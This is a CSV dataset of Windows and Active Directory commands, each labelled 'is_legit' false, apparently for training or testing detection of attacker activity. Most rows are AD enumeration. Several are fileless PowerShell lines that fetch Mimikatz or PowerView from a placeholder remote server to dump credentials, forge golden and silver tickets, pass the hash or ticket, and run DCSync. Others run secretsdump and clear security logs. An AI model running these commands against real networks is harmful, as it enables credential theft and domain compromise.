"Technique/Command_Name","Command","Type","Reference","is_legit"
"Collect Domain SID","Get-ADDomain | Select-Object SID","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-addomain","false"
"List Domain Controllers","nltest /dclist:domain","CMD","https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11)","false"
"Enumerate Domain Groups","Get-ADGroup -Filter * | Select-Object Name","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup","false"
"Check AD Replication Status","repadmin /replsummary","CMD","https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/repadmin","false"
"Enumerate Domain Users","Get-ADUser -Filter * | Select-Object Name, SamAccountName","PowerShell","https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet","false"
"Get Domain Password Policy","Get-ADDefaultDomainPasswordPolicy","PowerShell","https://github.com/tobor88/PowerShell-Red-Team","false"
"Identify Members of Domain Admins","Get-ADGroupMember -Identity ""Domain Admins""","PowerShell","https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroupmember","false"
"Check Kerberos Ticket Policy","Get-ADDefaultDomainPasswordPolicy | Select-Object -ExpandProperty KerberosTicketPolicy","PowerShell","https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet","false"
"List All Organizational Units (OUs)","Get-ADOrganizationalUnit -Filter *","PowerShell","https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adorganizationalunit","false"
"Identify Users with Delegation Privileges","Get-ADUser -Filter {TrustedForDelegation -eq $true}","PowerShell","https://github.com/tobor88/PowerShell-Red-Team","false"
"List AD Users with Details","Get-ADUser -Filter * -Properties DisplayName, EmailAddress, LastLogonDate","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory","false"
"Identify Accounts with SPNs (Kerberoasting)","Get-ADUser -Filter {ServicePrincipalName -ne ""$null""} -Properties ServicePrincipalName","PowerShell","https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet","false"
"Find Admin Accounts","dsquery user -name *admin*","CMD","https://book.hacktricks.xyz/windows-hardening/active-directory-methodology","false"
"List all Domain Computers","Get-ADComputer -Filter * | Select-Object Name, OperatingSystem","PowerShell","https://medium.com/@zycc2727/enumerating-active-directory-e1356579ebd","false"
"Check Group Policy Objects (GPOs)","Get-GPO -All","PowerShell","https://activedirectorypro.com/powershell-commands/","false"
"List Privileged Groups","net group ""Domain Admins"" /domain","CMD","https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide","false"
"Find Machines with Unconstrained Delegation","Get-ADComputer -Filter {TrustedForDelegation -eq $true}","PowerShell","https://github.com/tobor88/PowerShell-Red-Team","false"
"Check User Account Lockout Status","Get-ADUser -Filter * -Properties LockedOut | Where-Object {$_.LockedOut -eq $true}","PowerShell","https://www.exploit-db.com/docs/english/46990-active-directory-enumeration-with-powershell.pdf?ref=secjuice.com","false"
"Identify Expired Passwords","Search-ADAccount -PasswordExpired | Select-Object Name, PasswordExpired","PowerShell","https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/ad-enumeration","false"
"Query all Domain Services","nltest /dsgetdc:domain","CMD","https://medium.com/r3d-buck3t/domain-enumeration-with-active-directory-powershell-module-7ce4fcfe91d3","false"
"Enumerate Trusted Domains","nltest /trusted_domains","CMD","https://github.com/geeksniper/active-directory-pentest","false"
"List AD Sites","Get-ADReplicationSite -Filter *","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory","false"
"Get Domain Forest Information","Get-ADForest","PowerShell","https://www.cbtnuggets.com/blog/certifications/microsoft/6-common-active-directory-powershell-commands","false"
"Find SID History for Users (SID History Abuse)","Get-ADUser -Filter * -Properties SIDHistory | Where-Object {$_.SIDHistory}","PowerShell","https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet","false"
"Check Domain Controller Certificates","certutil -dcinfo verify","CMD","https://github.com/tobor88/PowerShell-Red-Team","false"
"Import PowerView Module","powershell -c ""IEX (New-Object Net.WebClient).DownloadString('http://remoteserver/PowerView.ps1'); Get-NetUser""","PowerShell","https://github.com/PowerShellMafia/PowerSploit","false"
"Import PowerUp Module","powershell -c ""IEX (New-Object Net.WebClient).DownloadString('http://remoteserver/PowerUp.ps1'); Invoke-AllChecks""","PowerShell","https://github.com/PowerShellMafia/PowerSploit","false"
"Find Domain Admins with PowerView","Get-NetGroup -GroupName ""Domain Admins"" | Get-NetGroupMember","PowerShell (PowerView)","https://github.com/PowerShellMafia/PowerSploit","false"
"List All Domains with PowerView","Get-NetDomain","PowerShell (PowerView)","https://book.hacktricks.xyz/windows-hardening/active-directory-methodology","false"
"Enumerate Domain Trusts with PowerView","Get-NetDomainTrust","PowerShell (PowerView)","https://medium.com/@zycc2727/enumerating-active-directory-e1356579ebd","false"
"Find Local Privilege Escalation Paths with PowerUp","Invoke-AllChecks","PowerShell (PowerUp)","https://github.com/PowerShellMafia/PowerSploit","false"
"Identify Local Administrators with PowerUp","Get-LocalGroupMember -Group ""Administrators""","PowerShell","https://github.com/PowerShellMafia/PowerSploit","false"
"Search for Kerberoastable Accounts with PowerView","Get-NetUser -SPN | Select-Object servicePrincipalName","PowerShell (PowerView)","https://github.com/PowerShellMafia/PowerSploit","false"
"List All Sessions on Domain Machines with PowerView","Get-NetSession -ComputerName target-machine","PowerShell (PowerView)","https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/ad-enumeration","false"
"Enumerate Local Admins on All Domain Machines with PowerView","Invoke-EnumerateLocalAdmin -ComputerName target-machine","PowerShell (PowerView)","https://github.com/PowerShellMafia/PowerSploit","false"
"Find Weak File Permissions with PowerUp","Invoke-CheckLocalAdminAccess","PowerShell (PowerUp)","https://github.com/PowerShellMafia/PowerSploit","false"
"Check Writable Registry Paths with PowerUp","Invoke-AllChecks | Select-Object WritableRegPaths","PowerShell (PowerUp)","https://github.com/PowerShellMafia/PowerSploit","false"
"Dump Domain Hashes with SecretsDump","secretsdump.py domain/username:password@target","Python (Impacket)","https://github.com/SecureAuthCorp/impacket","false"
"Check Domain Policies with PowerView","Get-DomainPolicy","PowerShell (PowerView)","https://github.com/PowerShellMafia/PowerSploit","false"
"Identify Interesting ACLs with PowerView","Find-InterestingDomainAcl","PowerShell (PowerView)","https://github.com/PowerShellMafia/PowerSploit","false"
"Enumerate Domain Users (LDAP)","dsquery user -name *","CMD","https://activedirectorypro.com/powershell-commands/","false"
"Get Domain Information","Get-ADDomain","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-addomain","false"
"Enumerate Domain Forest","Get-ADForest","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adforest","false"
"List All Users in the Domain","net user /domain","CMD","https://activedirectorypro.com/powershell-commands/","false"
"Get Domain Functional Level","Get-ADDomain | Select-Object DomainMode","PowerShell","https://book.hacktricks.xyz/windows-hardening/active-directory-methodology","false"
"List Domain Groups","Get-ADGroup -Filter * | Select-Object Name","PowerShell","https://medium.com/@zycc2727/enumerating-active-directory-e1356579ebd","false"
"Query Domain Controllers in Domain","nltest /dclist:domain","CMD","https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/nltest","false"
"Find DC Site Information","nltest /dsgetsite","CMD","https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/nltest","false"
"List All Computers in Domain","Get-ADComputer -Filter *","PowerShell","https://activedirectorypro.com/powershell-commands/","false"
"Get All Subnets in the Forest","Get-ADReplicationSubnet -Filter *","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adreplicationsubnet","false"
"Check LDAP Server Status","nltest /dsgetdc:domain /ldaponly","CMD","https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/nltest","false"
"Get AD DNS Zone Information","Get-DnsServerZone","PowerShell","https://learn.microsoft.com/en-us/powershell/module/dnsserver/get-dnsserverzone","false"
"Check Domain Group Membership","net group ""GroupName"" /domain","CMD","https://www.cbtnuggets.com/blog/certifications/microsoft/6-common-active-directory-powershell-commands","false"
"Get Domain Users Last Logon Time","Get-ADUser -Filter * -Properties LastLogonDate | Select Name, LastLogonDate","PowerShell","https://medium.com/r3d-buck3t/domain-enumeration-with-active-directory-powershell-module-7ce4fcfe91d3","false"
"List all Service Accounts","Get-ADUser -Filter {ServicePrincipalName -ne ""$null""} | Select Name, ServicePrincipalName","PowerShell","https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/ad-enumeration","false"
"Get Password Policy of Domain","Get-ADDefaultDomainPasswordPolicy","PowerShell","https://activedirectorypro.com/powershell-commands/","false"
"List Open File Shares on Domain Machines","net view \\target-machine","CMD","https://www.exploit-db.com/docs/english/46990-active-directory-enumeration-with-powershell.pdf?ref=secjuice.com","false"
"Find Active Directory Sites","Get-ADReplicationSite -Filter *","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adreplicationsite","false"
"List Organizational Units (OUs)","Get-ADOrganizationalUnit -Filter *","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adorganizationalunit","false"
"Check Group Policy for Computer","gpresult /r /scope computer","CMD","https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult","false"
"Query DNS Servers in Domain","Get-DnsServerResourceRecord -ZoneName ""domain.local""","PowerShell","https://learn.microsoft.com/en-us/powershell/module/dnsserver/get-dnsserverresourcerecord","false"
"Enumerate Global Catalog Servers","nltest /dsgetdc:/gc","CMD","https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/nltest","false"
"Get Domain Password Expiration Policy","net accounts /domain","CMD","https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide","false"
"Get Domain Controllers","Get-ADDomainController -Filter *","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-addomaincontroller","false"
"Enumerate All Organizational Units (OUs)","Get-ADOrganizationalUnit -Filter * | Select-Object Name, DistinguishedName","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adorganizationalunit","false"
"List Users in Specific Group","Get-ADGroupMember -Identity ""Domain Admins"" | Select-Object Name, SamAccountName","PowerShell","https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet","false"
"Check Last Logon Time for All Users","Get-ADUser -Filter * -Properties LastLogonDate | Where-Object {$_.LastLogonDate -ne $null} | Select-Object Name, LastLogonDate","PowerShell","https://activedirectorypro.com/powershell-commands/","false"
"List Active Directory Sites","Get-ADReplicationSite -Filter *","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adreplicationsite","false"
"Find Local Administrators on a Machine","net localgroup Administrators","CMD","https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/net-localgroup","false"
"Get Domain Users with Expired Passwords","Search-ADAccount -PasswordExpired | Select-Object Name, PasswordExpired","PowerShell","https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide","false"
"Query Domain Forest Global Catalog","nltest /gc","CMD","https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/nltest","false"
"Check Domain Admin Account Status","Get-ADUser -Filter {MemberOf -RecursiveMatch 'Domain Admins'} | Select-Object Name, Enabled","PowerShell","https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/ad-enumeration","false"
"List Privileged Accounts in Domain","Get-ADUser -Filter {AdminCount -eq 1} | Select-Object Name, SamAccountName","PowerShell","https://medium.com/r3d-buck3t/domain-enumeration-with-active-directory-powershell-module-7ce4fcfe91d3","false"
"Enumerate Group Policy Objects (GPO)","Get-GPO -All | Select-Object DisplayName, GpoStatus","PowerShell","https://github.com/tobor88/PowerShell-Red-Team","false"
"Identify Computers with Unconstrained Delegation","Get-ADComputer -Filter {TrustedForDelegation -eq $true} | Select-Object Name, DNSHostName","PowerShell","https://github.com/PowerShellMafia/PowerSploit","false"
"List All Domain Groups and Their Members","Get-ADGroup -Filter * | ForEach-Object {Get-ADGroupMember -Identity $_.Name | Select Name, SamAccountName}","PowerShell","https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet","false"
"Find Domain Password Policy Settings","net accounts /domain","CMD","https://activedirectorypro.com/powershell-commands/","false"
"List Service Principal Names (SPNs)","Get-ADUser -Filter {ServicePrincipalName -ne ""$null""} | Select-Object Name, ServicePrincipalName","PowerShell","https://book.hacktricks.xyz/windows-hardening/active-directory-methodology","false"
"Enumerate DNS Servers","Get-DnsServer | Select-Object Name, IPAddress","PowerShell","https://learn.microsoft.com/en-us/powershell/module/dnsserver/get-dnsserver","false"
"List Delegated Admins on Specific OU","Get-ACL ""OU=TestOU,DC=domain,DC=com"" | Format-List","PowerShell","https://medium.com/@zycc2727/enumerating-active-directory-e1356579ebd","false"
"Identify Expired Accounts","Search-ADAccount -AccountExpired | Select-Object Name, Enabled","PowerShell","https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet","false"
"Check Domain Controller Synchronization Status","repadmin /showrepl","CMD","https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/repadmin","false"
"Find Computers with LAPS Enabled","Find-AdmPwdExtendedRights -Identity ""OU=Workstations,DC=domain,DC=com""","PowerShell","https://learn.microsoft.com/en-us/powershell/module/laps/find-admpwdextendedrights","false"
"View All Replication Subnets","Get-ADReplicationSubnet -Filter *","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adreplicationsubnet","false"
"List Machines with High Privileges","Get-ADComputer -Filter {PrimaryGroupID -eq 512}","PowerShell","https://medium.com/r3d-buck3t/domain-enumeration-with-active-directory-powershell-module-7ce4fcfe91d3","false"
"Get AD Domain Sites and Subnets","Get-ADReplicationSite | Select-Object Name, SiteObjectGUID","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adreplicationsite","false"
"Enumerate Password Policies","Get-ADFineGrainedPasswordPolicy","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adfinegrainedpasswordpolicy","false"
"Find High-Value Targets (e.g., Admins with SPN)","Get-ADUser -Filter {ServicePrincipalName -ne ""$null"" -and MemberOf -like ""*Domain Admins*""} | Select Name, ServicePrincipalName","PowerShell","https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet","false"
"List All Domain Groups and Membership Counts","Get-ADGroup -Filter * | ForEach-Object {Write-Output ""$($_.Name): $((Get-ADGroupMember -Identity $_.Name).Count)""}","PowerShell","https://activedirectorypro.com/powershell-commands/","false"
"Find Sensitive Account Delegations","Get-ADUser -Filter {TrustedForDelegation -eq $true} | Select-Object Name, SamAccountName","PowerShell","https://book.hacktricks.xyz/windows-hardening/active-directory-methodology","false"
"Enumerate Domain Admins","Get-ADGroupMember -Identity ""Domain Admins"" | Select Name, SamAccountName, ObjectClass","PowerShell","https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet","false"
"Check for Kerberos Pre-Authentication Disabled Accounts","Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Select Name, SamAccountName","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-aduser","false"
"Find All Sessions on a Computer","quser /server:ComputerName","CMD","https://ss64.com/nt","false"
"Identify all GPO Permissions for a User","Get-GPPermission -All -User ""UserName"" | Select-Object DisplayName, Permission","PowerShell","https://learn.microsoft.com/en-us/powershell/module/grouppolicy/get-gppermission","false"
"Enumerate All Forest Trusts","Get-ADTrust -Filter *","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust","false"
"List Open Shares on Remote Computer","net view \\ComputerName /all","CMD","https://ss64.com/nt","false"
"Check if Machine is a Domain Controller","if ((Get-ADComputer -Identity ""ComputerName"").PrimaryGroupID -eq 516) { ""Domain Controller"" }","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adcomputer","false"
"List All Members of a Specific OU","Get-ADUser -SearchBase ""OU=Users,DC=domain,DC=com"" -Filter * | Select Name, SamAccountName","PowerShell","https://activedirectorypro.com/powershell-commands/","false"
"Identify Admin Accounts with Password Never Expire","Get-ADUser -Filter {PasswordNeverExpires -eq $true -and AdminCount -eq 1} | Select-Object Name","PowerShell","https://book.hacktricks.xyz/windows-hardening/active-directory-methodology","false"
"Get LAPS-Enabled Computers","Find-AdmPwdExtendedRights -Identity ""OU=Computers,DC=domain,DC=com""","PowerShell (LAPS)","https://learn.microsoft.com/en-us/powershell/module/laps/find-admpwdextendedrights","false"
"Check Active Directory Replication Queue","repadmin /queue","CMD","https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/repadmin","false"
"List All Kerberos Tickets in Cache","klist","CMD","https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/klist","false"
"Find Users with Expired Passwords","Search-ADAccount -PasswordExpired | Select-Object Name, SamAccountName","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/search-adaccount","false"
"List All Disabled Accounts in Domain","Search-ADAccount -AccountDisabled | Select-Object Name, SamAccountName","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/search-adaccount","false"
"List Privileges for a Specific Group","Get-ADGroupMember -Identity ""Enterprise Admins"" | Select Name, SamAccountName","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adgroupmember","false"
"List Sessions on a Domain Controller","qwinsta /server:DomainControllerName","CMD","https://ss64.com/nt/query-session.html","false"
"Check Domain Controllers Replication Status","Get-ADReplicationPartnerMetadata -Target ""DC=domain,DC=com""","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adreplicationpartnermetadata","false"
"List Local Administrators on Remote System","net localgroup Administrators /domain","CMD","https://ss64.com/nt","false"
"Run Mimikatz as Admin (Fileless)","IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'","PowerShell (Fileless)","https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/mimikatz-cheatsheet/#summary","false"
"Dump Credentials from Memory (Fileless)","IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'","PowerShell (Fileless)","https://hadess.io/mimikatz-comprehensive-guide/","false"
"Extract Kerberos Ticket (Fileless)","IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Command 'kerberos::list /export'","PowerShell (Fileless)","https://adsecurity.org/?page_id=1821","false"
"Pass-the-Hash Attack (Fileless)","IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Command 'sekurlsa::pth /user:UserName /domain:domain.local /ntlm:hash /run:powershell.exe'","PowerShell (Fileless)","https://akimbocore.com/article/privilege-escalation-extracting-passwords-with-mimikatz/","false"
"Enumerate All Registry Keys","reg query HKLM","CMD","https://ss64.com/nt/","false"
"Check AutoStart Programs","reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run","CMD","https://book.hacktricks.xyz/windows-hardening/windows-registry-persistence","false"
"Modify Registry Key Permissions","reg add HKLM\Software\ExampleKey /v ExampleValue /t REG_SZ /d ""ExampleData"" /f","CMD","https://ss64.com/nt/","false"
"Export Registry Hive","reg export HKLM\Software\MyKey mykey.reg","CMD","https://ss64.com/nt/","false"
"Force Group Policy Update","gpupdate /force","CMD","https://ss64.com/nt/","false"
"List Applied GPOs for Computer","gpresult /R /SCOPE COMPUTER","CMD","https://ss64.com/nt/","false"
"Enumerate All GPOs Linked to OU","Get-GPLink -Domain domain.local -Target ""OU=ExampleOU,DC=domain,DC=local""","PowerShell","https://learn.microsoft.com/en-us/powershell/module/grouppolicy/get-gplink","false"
"List All Group Policies in Domain","Get-GPO -All","PowerShell","https://learn.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo","false"
"Find Local Admins on Remote Machine","net localgroup Administrators /domain","CMD","https://ss64.com/nt/","false"
"View Security Event Logs","Get-EventLog -LogName Security -Newest 100","PowerShell","https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-eventlog","false"
"Clear Security Event Logs","Clear-EventLog -LogName Security","PowerShell","https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/clear-eventlog","false"
"Enable Remote Desktop (RDP)","reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f","CMD","https://book.hacktricks.xyz/windows-hardening/enable-rdp-windows","false"
"Golden Ticket Attack (Fileless)","IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Command 'kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21- /krbtgt: /id:500' Load the ticket in session:  		        IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Command 'kerberos::ptt '","PowerShell (Fileless)","https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-attacks/golden-ticket","false"
"Silver Ticket Attack (Fileless)","IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Command 'kerberos::golden /user:UserName /domain:domain.local /sid:S-1-5-21- /target:ServerName /rc4: /service:cifs /id:500' Load the ticket in session:  		        IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Command 'kerberos::ptt '","PowerShell (Fileless)","https://adsecurity.org/?p=2011","false"
"Pass-the-Ticket Attack (Fileless)","Dump Kerberos tickets in memory:  		        IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Command 'sekurlsa::tickets' Use a specific Kerberos ticket:  		        IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Command 'kerberos::ptt '","PowerShell (Fileless)","https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/mimikatz-cheatsheet/#pass-the-ticket","false"
"Dump Cached Domain Credentials (Fileless)","IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Command 'sekurlsa::logonpasswords' (Requires elevated privileges)","PowerShell (Fileless)","https://hadess.io/mimikatz-comprehensive-guide/","false"
"Dump Domain Credentials using DCSync (Fileless)","IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Command 'lsadump::dcsync /domain:domain.local /user:Administrator'","PowerShell (Fileless)","https://adsecurity.org/?p=1729","false"
"Enable Remote Desktop (RDP)","reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f","CMD","https://book.hacktricks.xyz/windows-hardening/enable-rdp-windows","false"
"Check Registry Keys for Persistence","reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run","CMD","https://ss64.com/nt/","false"
"List User Rights Assignments","Get-GPResultantSetOfPolicy -User domain\username -ReportType Html -Path C:\gporeport.html","PowerShell","https://learn.microsoft.com/en-us/powershell/module/grouppolicy/get-gpresulstantsetofpolicy","false"
"Export All Group Policy Objects","Backup-GPO -All -Path ""C:\GPOBackups""","PowerShell","https://learn.microsoft.com/en-us/powershell/module/grouppolicy/backup-gpo","false"
"Pass-the-Hash Attack on Local Account","sekurlsa::pth /user:LocalUser /domain:localhost /ntlm: /run:powershell.exe","Mimikatz","https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz","false"
"Query Active Directory Replication Partners","repadmin /showrepl","CMD","https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/repadmin","false"
"List All Active Directory Sites","Get-ADReplicationSite -Filter *","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adreplicationsite","false"
"Identify Domain Admins Group Members","Get-ADGroupMember -Identity ""Domain Admins""","PowerShell","https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adgroupmember","false"
